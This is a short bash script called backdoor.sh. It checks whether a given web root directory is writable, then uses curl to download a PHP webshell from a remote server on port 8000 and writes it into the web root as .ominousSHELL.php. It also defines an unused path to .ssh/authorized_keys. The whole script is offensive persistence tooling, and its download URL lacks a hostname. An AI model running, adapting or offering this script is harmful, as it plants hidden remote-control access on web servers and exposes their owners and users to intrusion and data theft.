#!/bin/bash

#Variables
webroot=$2
path="$1.ssh/authorized_keys"
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"

#Usage
if [[ $1 == '' ]];then
	echo 'Usage:./backdoor.sh'
	exit
fi

web() {
	if [[ $webroot == '' ]]; then
		exit
	fi
	printf "$blue[+] Attempting to set WEBSHELL backdoor...\n"
	if [[ -e "$webroot" ]];then
		if [[ -w "$webroot" ]];then
			curl -sS http://:8000/w-shell.php \
				>> "$webroot.ominousSHELL.php"
			if [[ $? == 0 ]];then
				printf "$green[+] Done.\n"
				printf "$green[+] File: $webroot.ominousSHELL.php\n"
			else
				printf "$red[-] Error occured\n"
			fi
		else
			printf "$red[-] Error: Directory \"$webroot\" is not writable\n"
		fi
	else
		printf "$red[-] Error: Directory \"$webroot\" does not exist\n"
	fi

}
web
printf "$blue[+] Done.\n"
